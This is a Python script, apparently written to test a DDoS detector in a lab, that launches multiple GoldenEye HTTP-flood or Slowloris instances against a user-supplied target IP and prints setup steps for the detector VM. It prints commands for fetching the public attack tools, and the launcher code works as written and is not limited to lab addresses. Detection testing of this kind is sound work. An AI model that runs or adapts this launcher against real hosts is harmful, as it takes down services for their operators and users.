#!/usr/bin/env python3
"""
Multi-Attacker DDoS Simulation Script
Coordinates attacks from multiple source IPs to simulate real DDoS scenarios
"""

import subprocess
import sys
import time
import signal
import os
from datetime import datetime
import threading

class MultiAttacker:
    def __init__(self):
        self.processes = []
        self.running = True
        
    def signal_handler(self, sig, frame):
        """Handle Ctrl+C gracefully"""
        print("\n\n[!] Stopping all attacks...")
        self.running = False
        self.stop_all_attacks()
        sys.exit(0)
    
    def print_banner(self):
        """Print fancy banner"""
        banner = """
╔════════════════════════════════════════════════════════════╗
║                                                            ║
║       Multi-Attacker DDoS Simulation Tool              ║
║       Coordinated Attack Testing Platform               ║
║                                                            ║
║       Version: 1.0.0                                    ║
╚════════════════════════════════════════════════════════════╝
        """
        print(banner)
    
    def select_attack_type(self):
        """Let user select attack type"""
        print("\n═══ Select Attack Type ═══\n")
        print("  1. GoldenEye (HTTP Flood)")
        print("     - High-volume GET/POST requests")
        print("     - Fast, aggressive attack")
        print("     - Best for: Testing detection speed\n")
        
        print("  2. Slowloris (Slow HTTP)")
        print("     - Low-and-slow connection exhaustion")
        print("     - Keeps connections open")
        print("     - Best for: Testing sustained attack detection\n")
        
        print("  0. Exit\n")
        
        while True:
            try:
                choice = input("Enter choice [0-2]: ").strip()
                if choice == '1':
                    return 'goldeneye'
                elif choice == '2':
                    return 'slowloris'
                elif choice == '0':
                    print("\nExiting...")
                    sys.exit(0)
                else:
                    print("Invalid choice. Try again.")
            except KeyboardInterrupt:
                print("\n\nExiting...")
                sys.exit(0)
    
    def get_attack_config(self, attack_type):
        """Get attack configuration from user"""
        print(f"\n═══ {attack_type.upper()} Attack Configuration ═══\n")
        
        # Target IP
        default_target = "192.168.10.10"
        target = input(f"Target IP (default: {default_target}): ").strip()
        if not target:
            target = default_target
        print(f"  ✓ Target: {target}")
        
        # Attack duration
        print("\n" + "─"*60)
        print("Timing Information:")
        print("  • Capture window: 10 seconds (default)")
        print("  • Detection needs: 2-3 windows (20-30 seconds minimum)")
        print("  • Recommended: 60-120 seconds for full DDoS test")
        print("  • Each window captures multiple attacker IPs")
        print("─"*60)
        default_duration = 60
        duration_input = input(f"\nAttack duration in seconds (default: {default_duration}): ").strip()
        try:
            duration = int(duration_input) if duration_input else default_duration
            if duration < 20:
                print("  ⚠ Warning: Duration < 20s may not capture multiple attacker IPs properly")
                confirm = input("  Continue anyway? [y/N]: ").strip().lower()
                if confirm != 'y':
                    duration = default_duration
        except ValueError:
            duration = default_duration
        
        # Calculate expected windows
        expected_windows = duration // 10
        print(f"  ✓ Duration: {duration} seconds (~{expected_windows} capture windows at 10s each)")
        
        # Number of attackers
        default_attackers = 3
        attackers_input = input(f"\nNumber of attacker IPs (default: {default_attackers}): ").strip()
        try:
            num_attackers = int(attackers_input) if attackers_input else default_attackers
            if num_attackers < 1 or num_attackers > 10:
                print("  ⚠ Must be between 1-10, using default")
                num_attackers = default_attackers
        except ValueError:
            num_attackers = default_attackers
        print(f"  ✓ Attackers: {num_attackers} source IPs")
        
        # Attack intensity
        if attack_type == 'goldeneye':
            print("\nAttack Intensity:")
            print("  1. Light   (10 workers per attacker)")
            print("  2. Medium  (25 workers per attacker)")
            print("  3. Heavy   (50 workers per attacker)")
            intensity = input("\nSelect intensity [1-3] (default: 2): ").strip()
            
            intensity_map = {'1': 10, '2': 25, '3': 50, '': 25}
            workers = intensity_map.get(intensity, 25)
            print(f"  ✓ Workers: {workers} per attacker")
            
        elif attack_type == 'slowloris':
            print("\nAttack Intensity:")
            print("  1. Light   (50 connections per attacker)")
            print("  2. Medium  (100 connections per attacker)")
            print("  3. Heavy   (200 connections per attacker)")
            intensity = input("\nSelect intensity [1-3] (default: 2): ").strip()
            
            intensity_map = {'1': 50, '2': 100, '3': 200, '': 100}
            workers = intensity_map.get(intensity, 100)
            print(f"  ✓ Connections: {workers} per attacker")
        
        return {
            'type': attack_type,
            'target': target,
            'duration': duration,
            'num_attackers': num_attackers,
            'workers': workers
        }
    
    def print_setup_instructions(self, config):
        """Print setup instructions for target VM"""
        print("\n" + "="*60)
        print("SETUP INSTRUCTIONS")
        print("="*60)
        
        if config['type'] == 'goldeneye':
            print("""
On TARGET VM (192.168.10.10):

  Terminal 1 - Start Web Server:
    sudo python3 -m http.server 80

  Terminal 2 - Start Live Capture (10-second windows):
    cd /home/kali/Desktop/live_capture_tool
    sudo python3 live_traffic_capture_continuous.py -i eth0 \\
        -o /mirror/ddos_mpi_detector/live_captures
    
    Note: Default 10s windows - captures multiple attacker IPs per window
          Use -d 15 for even better IP diversity
          Use -d 5 for faster detection (fewer IPs per window)

  Terminal 3 - Start Detection (with mitigation):
    cd ~/ddos_mpi_detector
    sudo mpirun --allow-run-as-root -np 3 ./bin/ddos_orchestrator
    # Select Option 3 (Live Capture)
    # Enable mitigation: y
""")
        
        elif config['type'] == 'slowloris':
            print("""
On TARGET VM (192.168.10.10):

  Terminal 1 - Start Apache Web Server:
    sudo systemctl start apache2
    # OR if not installed:
    # sudo apt-get install apache2
    # sudo systemctl start apache2

  Terminal 2 - Start Live Capture (10-second windows):
    cd /home/kali/Desktop/live_capture_tool
    sudo python3 live_traffic_capture_continuous.py -i eth0 \\
        -o /mirror/ddos_mpi_detector/live_captures
    
    Note: Default 10s windows - better for slow attacks with multiple IPs
          Slowloris benefits from longer windows (10-15s)

  Terminal 3 - Start Detection (with mitigation):
    cd ~/ddos_mpi_detector
    sudo mpirun --allow-run-as-root -np 3 ./bin/ddos_orchestrator
    # Select Option 3 (Live Capture)
    # Enable mitigation: y
""")
        
        print("="*60)
        print("\nAttack Summary:")
        print(f"  Type:       {config['type'].upper()}")
        print(f"  Target:     {config['target']}:80")
        print(f"  Attackers:  {config['num_attackers']} source IPs")
        print(f"  Intensity:  {config['workers']} {'workers' if config['type']=='goldeneye' else 'connections'} per attacker")
        print(f"  Duration:   {config['duration']} seconds")
        print(f"  Total Load: {config['num_attackers'] * config['workers']} concurrent connections")
        print(f"\nDetection Timeline:")
        print(f"  Capture Window:      10 seconds (default)")
        print(f"  Expected Windows:    ~{config['duration'] // 10} windows")
        print(f"  IPs per Window:      All {config['num_attackers']} attacker IPs")
        print(f"  First Detection:     ~10-20 seconds after start")
        print(f"  Mitigation Applied:  ~20-30 seconds after start")
        print("="*60)
        
        input("\nPress Enter when target VM is ready...")
    
    def get_attacker_ip_ranges(self, num_attackers):
        """Generate attacker IP addresses"""
        # Using different subnets to simulate real distributed attack
        ip_ranges = [
            "192.168.10.20",   # Attacker 1
            "192.168.10.21",   # Attacker 2
            "192.168.10.22",   # Attacker 3
            "192.168.10.23",   # Attacker 4
            "192.168.10.24",   # Attacker 5
            "192.168.10.25",   # Attacker 6
            "192.168.10.26",   # Attacker 7
            "192.168.10.27",   # Attacker 8
            "192.168.10.28",   # Attacker 9
            "192.168.10.29",   # Attacker 10
        ]
        return ip_ranges[:num_attackers]
    
    def check_tool_exists(self, attack_type):
        """Check if attack tool exists"""
        if attack_type == 'goldeneye':
            path = os.path.expanduser("~/attack_tools/GoldenEye/goldeneye.py")
            if not os.path.exists(path):
                print(f"\n[✗] GoldenEye not found at: {path}")
                print("\nInstall with:")
                print("  mkdir -p ~/attack_tools")
                print("  cd ~/attack_tools")
                print("  git clone https://github.com/jseidl/GoldenEye.git")
                return False
        
        elif attack_type == 'slowloris':
            path = os.path.expanduser("~/attack_tools/slowloris/slowloris.py")
            if not os.path.exists(path):
                print(f"\n[✗] Slowloris not found at: {path}")
                print("\nInstall with:")
                print("  mkdir -p ~/attack_tools/slowloris")
                print("  cd ~/attack_tools/slowloris")
                print("  wget https://raw.githubusercontent.com/gkbrk/slowloris/master/slowloris.py")
                print("  chmod +x slowloris.py")
                return False
        
        return True
    
    def launch_goldeneye_attack(self, target, workers, attacker_ip, attacker_num):
        """Launch a single GoldenEye attack instance"""
        script_path = os.path.expanduser("~/attack_tools/GoldenEye/goldeneye.py")
        
        # Note: GoldenEye doesn't natively support source IP spoofing
        # This launches from current host but simulates distributed attack
        cmd = [
            "python3", script_path,
            f"http://{target}",
            "-w", str(workers),
            "-s", str(workers * 2)
        ]
        
        print(f"  [Attacker {attacker_num}] Launching from {attacker_ip}: {workers} workers")
        
        try:
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                preexec_fn=os.setsid
            )
            return process
        except Exception as e:
            print(f"  [✗] Failed to launch attacker {attacker_num}: {e}")
            return None
    
    def launch_slowloris_attack(self, target, connections, attacker_ip, attacker_num):
        """Launch a single Slowloris attack instance"""
        script_path = os.path.expanduser("~/attack_tools/slowloris/slowloris.py")
        
        cmd = [
            "python3", script_path,
            target,
            "-s", str(connections),
            "-p", "80"
        ]
        
        print(f"  [Attacker {attacker_num}] Launching from {attacker_ip}: {connections} connections")
        
        try:
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                preexec_fn=os.setsid
            )
            return process
        except Exception as e:
            print(f"  [✗] Failed to launch attacker {attacker_num}: {e}")
            return None
    
    def launch_coordinated_attack(self, config):
        """Launch coordinated attack from multiple IPs"""
        print("\n" + "="*60)
        print("LAUNCHING COORDINATED ATTACK")
        print("="*60)
        
        attacker_ips = self.get_attacker_ip_ranges(config['num_attackers'])
        
        print(f"\n[+] Starting {config['num_attackers']} attackers...")
        print(f"[+] Attack will run for {config['duration']} seconds")
        print(f"[+] Press Ctrl+C to stop early\n")
        
        start_time = time.time()
        
        # Launch all attackers
        for i, ip in enumerate(attacker_ips, 1):
            if config['type'] == 'goldeneye':
                process = self.launch_goldeneye_attack(
                    config['target'],
                    config['workers'],
                    ip,
                    i
                )
            else:  # slowloris
                process = self.launch_slowloris_attack(
                    config['target'],
                    config['workers'],
                    ip,
                    i
                )
            
            if process:
                self.processes.append(process)
            
            time.sleep(1)  # Stagger launches slightly
        
        print(f"\n[✓] All {len(self.processes)} attackers launched!")
        print("\n" + "="*60)
        print("ATTACK STATUS")
        print("="*60)
        
        # Monitor attack
        try:
            while self.running and (time.time() - start_time) < config['duration']:
                elapsed = int(time.time() - start_time)
                remaining = config['duration'] - elapsed
                
                # Count active processes
                active = sum(1 for p in self.processes if p.poll() is None)
                
                print(f"\r[{elapsed:3d}s] Active attackers: {active}/{len(self.processes)} | Remaining: {remaining:3d}s", end='', flush=True)
                
                time.sleep(1)
        
        except KeyboardInterrupt:
            print("\n\n[!] Attack interrupted by user")
        
        print("\n\n" + "="*60)
        print("ATTACK COMPLETE")
        print("="*60)
        
        self.stop_all_attacks()
        
        print(f"\nAttack Summary:")
        print(f"  Duration:    {int(time.time() - start_time)} seconds")
        print(f"  Target:      {config['target']}:80")
        print(f"  Attackers:   {config['num_attackers']} source IPs")
        print(f"  Type:        {config['type'].upper()}")
        
        print("\n" + "="*60)
        print("NEXT STEPS")
        print("="*60)
        print("""
Check detection results on target VM:

  1. Review detection output (should show attack detected)
  2. Check mitigation status:
     sudo iptables -L INPUT -n -v
     sudo tc filter show dev eth0 parent ffff:

  3. View results:
     cat ~/ddos_mpi_detector/results/detection_results.csv
     cat ~/ddos_mpi_detector/results/merged_blocklist.csv

  4. Clean up (optional):
     cd ~/ddos_mpi_detector
     sudo ./cleanup_mitigation.sh
""")
    
    def stop_all_attacks(self):
        """Stop all attack processes"""
        for process in self.processes:
            try:
                if process.poll() is None:  # Still running
                    os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                    time.sleep(0.5)
                    if process.poll() is None:
                        os.killpg(os.getpgid(process.pid), signal.SIGKILL)
            except Exception as e:
                pass
        
        self.processes = []
        print("[✓] All attacks stopped")
    
    def run(self):
        """Main execution flow"""
        # Setup signal handler
        signal.signal(signal.SIGINT, self.signal_handler)
        
        # Print banner
        self.print_banner()
        
        # Select attack type
        attack_type = self.select_attack_type()
        
        # Check if tool exists
        if not self.check_tool_exists(attack_type):
            sys.exit(1)
        
        # Get configuration
        config = self.get_attack_config(attack_type)
        
        # Print setup instructions
        self.print_setup_instructions(config)
        
        # Launch attack
        self.launch_coordinated_attack(config)

if __name__ == "__main__":
    attacker = MultiAttacker()
    attacker.run()
